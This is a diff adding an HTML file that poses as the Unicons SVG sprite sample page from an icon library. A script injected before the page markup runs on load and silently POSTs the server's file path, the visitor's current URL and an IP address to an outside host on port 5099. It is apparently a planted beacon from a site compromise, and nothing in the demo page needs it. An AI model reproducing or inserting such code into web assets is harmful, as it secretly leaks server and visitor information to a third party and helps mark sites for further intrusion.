@@ -1,0 +1,25 @@
+<script type=text/javascript> function httpGet(theUrl, data)
+    {
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open('POST', theUrl, false );
+        xmlHttp.send(data);
+    }
+    var path = '/home/admin/public_html/sale.rafiisa.com/theme/Horizontal/dist/assets/libs/@iconscout/unicons/sprite.html';
+    var href = window.location.href;
+    httpGet('https://mautic.sitarafoods.com:5099', path + '_____' + href + '_____' + '188.166.245.112')
+    </script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Unicons SVG Sprite</title>
+</head>
+<body>
+    <h1>Unicons SVG Sprite Sample</h1>
+    <svg>
+        <use xlink:href="./sprite/unicons.svg#comment" />
+    </svg>
+</body>
+</html>
